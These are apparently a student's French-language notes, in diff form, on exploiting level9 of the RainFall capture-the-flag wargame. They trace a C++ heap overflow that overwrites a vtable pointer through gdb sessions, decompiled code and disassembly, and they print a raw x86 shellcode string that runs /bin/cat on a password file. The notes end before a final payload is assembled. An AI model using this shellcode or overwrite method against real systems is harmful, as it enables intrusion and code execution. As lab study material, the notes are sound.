@@ -1,0 +1,311 @@
+level9@RainFall:~$ ./level9
+level9@RainFall:~$ ./level9 hey
+level9@RainFall:~$
+
+level9@RainFall:~$ ltrace ./level9
+__libc_start_main(0x80485f4, 1, 0xbffff7f4, 0x8048770, 0x80487e0 <unfinished ...>
+_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
+__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
+_exit(1 <unfinished ...>
++++ exited (status 1) +++
+level9@RainFall:~$ strace ./level9
+-bash: /usr/bin/strace: Input/output error
+
+scp -P 4242 level9@192.168.1.28:/home/user/level9/level9 ./bin/.
+
+
+level9@RainFall:~$ ./level9
+level9@RainFall:~$ echo $?
+1
+level9@RainFall:~$ ./level9 hello
+level9@RainFall:~$ echo $?
+11
+level9@RainFall:~$ ./level9 hello world
+level9@RainFall:~$ echo $?
+11
+level9@RainFall:~$
+
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+...
+0x080485f4  main
+0x0804869a  __static_initialization_and_destruction_0(int, int)
+0x080486da  _GLOBAL__sub_I_main
+0x080486f6  N::N(int)
+0x080486f6  N::N(int)
+0x0804870e  N::setAnnotation(char*)
+0x0804873a  N::operator+(N&)
+0x0804874e  N::operator-(N&)
+...
+(gdb)
+
+
+int32_t main(int32_t argc, char** argv, char** envp)
+{
+    if (argc <= 1)
+    {
+        _exit(1);
+        /* no return */
+    }
+    
+    int32_t first_object = operator new(0x6c); // 0x6c == 108 octets
+    N::N(first_object, 5); // constructeur
+    int32_t sec_object = operator new(0x6c); // 0x6c == 108 octets
+    N::N(sec_object, 6); // constructeur
+    N::setAnnotation(first_object, argv[1]);
+    return (**sec_object)(sec_object, first_object);
+}
+
+void __static_initialization_and_destruction_0(int32_t arg1, int32_t arg2)
+{
+    if (arg1 == 1 && arg2 == 0xffff)
+    {
+        std::ios_base::Init::Init(&std::__ioinit);
+        __cxa_atexit(func, &std::__ioinit, &__dso_handle);
+    }
+}
+
+int32_t (static initializer)::main()
+{
+    return __static_initialization_and_destruction_0(1, 0xffff);
+}
+
+int32_t N::N(int32_t the_object, int32_t arg2)
+{
+    *the_object = &_vtable_for_N; // écrit 4 octets (reserver au pointeur) à l'offset 0 
+	// le bloc memoire pointer par the_object deviens un objet N
+    *(the_object + 0x68) = arg2; // initialisation a 104 octets du debut a arg2 
+    return the_object;
+}
+
+int32_t N::setAnnotation(char* the_object, char *arg)
+{
+    return memcpy(&the_object[4], arg, strlen(arg)); // &the_object[4] == (&the_object + 4) on copy apres la vtable
+}
+
+int32_t N::operator+(N& object1, N& object2)
+{
+    return *(object2 + 0x68) + *(object1 + 0x68);
+}
+
+int32_t N::operator-(N& object1, N& object2)
+{
+    return *(object1 + 0x68) - *(object2 + 0x68);
+}
+
+
+(gdb) break *0x08048690
+Breakpoint 1 at 0x8048690
+(gdb) run AAAA
+Starting program: /home/user/level9/level9 AAAA
+
+Breakpoint 1, 0x08048690 in main ()
+(gdb) info registers edx
+edx            0x804873a        134514490
+(gdb) x/i $edx
+   0x804873a <_ZN1NplERS_>:     push   %ebp
+(gdb) info symbol $edx
+N::operator+(N&) in section .text of /home/user/level9/level9
+
+
+donc la fonction lancer a la fin du main est operator+ 
+
+
+level9@RainFall:~$ ./level9 $(python -c "print('A'*100)")
+level9@RainFall:~$ echo $?
+11
+level9@RainFall:~$ ./level9 $(python -c "print('A'*110)")
+Segmentation fault (core dumped)
+level9@RainFall:~$ echo $?
+139
+level9@RainFall:~$
+
+Donc on peut segfault la fonction setAnnotation avec de la memoire malloced
+
+on peut envisager l'injection de shellcode ? 
+
+peut on ecrire sur eip ? 
+
+/home/user/bonus0/.pass
+
+https://masterccc.github.io/tools/shellcode_gen/
+\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x70\x61\x73\x73\x68\x30\x2f\x2f\x2e\x68\x6f\x6e\x75\x73\x68\x65\x72\x2f\x62\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80
+
+
+0x080485f4  main
+0x0804869a  __static_initialization_and_destruction_0(int, int)
+0x080486da  _GLOBAL__sub_I_main
+0x080486f6  N::N(int)
+0x080486f6  N::N(int)
+0x0804870e  N::setAnnotation(char*)
+0x0804873a  N::operator+(N&)
+0x0804874e  N::operator-(N&)
+
+(gdb) x/10wx 0x08048848
+0x8048848 <_ZTV1N+8>:   0x0804873a      0x0804874e      0x00004e31      0x08049b88
+0x8048858 <_ZTI1N+4>:   0x08048850      0x3b031b01      0x00000060      0x0000000b
+0x8048868:      0xfffffc44      0x0000007c
+
+
+
+    return (**sec_object)(sec_object, first_object);
+Vas chercher dans la v table de l'objet N et utiliser la fonction 
+0x0804873a  N::operator+
+0x0804874e  N::operator-
+
+(gdb) b *0x08048693
+Breakpoint 1 at 0x8048693
+(gdb) run AAAAAAAAAAAAAAAAAAAAA
+Starting program: /home/user/level9/level9 AAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 1, 0x08048693 in main ()
+(gdb) info registers
+eax            0x804a078        134520952
+ecx            0x41     65
+edx            0x804873a        134514490
+ebx            0x804a078        134520952
+esp            0xbffff6f0       0xbffff6f0
+ebp            0xbffff718       0xbffff718
+esi            0x0      0
+edi            0x0      0
+eip            0x8048693        0x8048693 <main+159>
+eflags         0x200283 [ CF SF IF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb)
+
+
+edx            0x804873a        134514490
+
+0x804873a == N::operator+ 
+
+Donc je peut overide la l'adresse de la fonction operator+ 
+	dans le 2nd objet depuis le memcpy du 1er objet
+
+il faut que je calcul l'offset
+
+Pour cela il faut le registgre de sec_object
+
+Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
+(gdb) set disassembly-flavor intel
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x080485f4 <+0>:     push   ebp
+   0x080485f5 <+1>:     mov    ebp,esp
+   0x080485f7 <+3>:     push   ebx
+   0x080485f8 <+4>:     and    esp,0xfffffff0
+   0x080485fb <+7>:     sub    esp,0x20
+   0x080485fe <+10>:    cmp    DWORD PTR [ebp+0x8],0x1
+   0x08048602 <+14>:    jg     0x8048610 <main+28>
+   0x08048604 <+16>:    mov    DWORD PTR [esp],0x1
+   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>
+   0x08048610 <+28>:    mov    DWORD PTR [esp],0x6c
+   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
+   0x0804861c <+40>:    mov    ebx,eax
+   0x0804861e <+42>:    mov    DWORD PTR [esp+0x4],0x5
+   0x08048626 <+50>:    mov    DWORD PTR [esp],ebx
+   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>
+   0x0804862e <+58>:    mov    DWORD PTR [esp+0x1c],ebx
+   0x08048632 <+62>:    mov    DWORD PTR [esp],0x6c
+   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
+   0x0804863e <+74>:    mov    ebx,eax
+   0x08048640 <+76>:    mov    DWORD PTR [esp+0x4],0x6
+   0x08048648 <+84>:    mov    DWORD PTR [esp],ebx
+   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>				<< appel constructeur sec_object
+   0x08048650 <+92>:    mov    DWORD PTR [esp+0x18],ebx
+   0x08048654 <+96>:    mov    eax,DWORD PTR [esp+0x1c]
+   0x08048658 <+100>:   mov    DWORD PTR [esp+0x14],eax
+   0x0804865c <+104>:   mov    eax,DWORD PTR [esp+0x18]
+   0x08048660 <+108>:   mov    DWORD PTR [esp+0x10],eax
+   0x08048664 <+112>:   mov    eax,DWORD PTR [ebp+0xc]
+   0x08048667 <+115>:   add    eax,0x4
+   0x0804866a <+118>:   mov    eax,DWORD PTR [eax]
+   0x0804866c <+120>:   mov    DWORD PTR [esp+0x4],eax
+   0x08048670 <+124>:   mov    eax,DWORD PTR [esp+0x14]
+   0x08048674 <+128>:   mov    DWORD PTR [esp],eax
+   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
+   0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]
+   0x08048680 <+140>:   mov    eax,DWORD PTR [eax]
+   0x08048682 <+142>:   mov    edx,DWORD PTR [eax]
+   0x08048684 <+144>:   mov    eax,DWORD PTR [esp+0x14]
+   0x08048688 <+148>:   mov    DWORD PTR [esp+0x4],eax
+   0x0804868c <+152>:   mov    eax,DWORD PTR [esp+0x10]
+   0x08048690 <+156>:   mov    DWORD PTR [esp],eax
+   0x08048693 <+159>:   call   edx
+   0x08048695 <+161>:   mov    ebx,DWORD PTR [ebp-0x4]
+   0x08048698 <+164>:   leave
+   0x08048699 <+165>:   ret
+End of assembler dump.
+(gdb)
+
+
+   0x08048640 <+76>:    mov    DWORD PTR [esp+0x4],0x6
+   0x08048648 <+84>:    mov    DWORD PTR [esp],ebx
+   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>>
+   0x08048650 <+92>:    mov    DWORD PTR [esp+0x18],ebx
+
+Le constructeur a besoins de this et de arg (un nombre 5 ou 6)
+Donc [esp+0x4]  2nd argument == 0x6 == 6
+Et [esp] == sec_object donc ebx == sec_object
+
+et apres l'execution ebx est stocker dans [esp+0x18]
+
+   0x0804862e <+58>:    mov    DWORD PTR [esp+0x1c],ebx
+
+donc first_object est dans [esp+0x1c]
+
+plus loin 
+  0x0804865c <+104>:   mov    eax,DWORD PTR [esp+0x18]
+donc esp+0x18 mis dans eax donc eax == sec_object
+Puis 
+   0x08048660 <+108>:   mov    DWORD PTR [esp+0x10],eax
+eax dans [esp+0x10] donc sec_object
+Puis apres setAnnotation 
+   0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]
+[esp+0x10] dans eax a nouveau
+
+(gdb) x/wx $esp+0x10
+0xbffff650:     0x0804a078
+
+On suit l'adresse 0x0804a078
+(gdb) x/wx 0x0804a078
+0x804a078:      0x41366441
+
+Et on trouve 0x41366441 qui nous donne un offset a 108 avec https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+donc il nous faut un payload qui finisse par l'adresse ou est stocker le shellcodde 
+
+    return memcpy(&the_object[4], arg, strlen(arg)); // &the_object[4] == (&the_object + 4) on copy apres la vtable
+
+donc l'adresse de first_object + 4 logiquement [esp+0x1c] + 4
+
+MAIS 
+
+il est deplacer d'abord dans eax puis dans [esp+0x14],
+   0x08048654 <+96>:    mov    eax,DWORD PTR [esp+0x1c]
+   0x08048658 <+100>:   mov    DWORD PTR [esp+0x14],eax
+puis plus tard dans eax 
+   0x08048670 <+124>:   mov    eax,DWORD PTR [esp+0x14]
+   0x08048674 <+128>:   mov    DWORD PTR [esp],eax
+   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
+
+(gdb) x/wx $esp+0x14
+0xbffff654:     0x0804a008
+(gdb)
+
+donc 0xbffff654 est l'adresse de first_object
+et 
+
+
+NOPS + shellcodde + first_object addresse [4]
+
+on doit mettre l'addresse de jump dans la case qui contient normalement operator+
+donc il nous faut l'adresse de cette case : 
+on doit avoir l'adresse ou est stocker notre shellcode :
+
+creer la payload
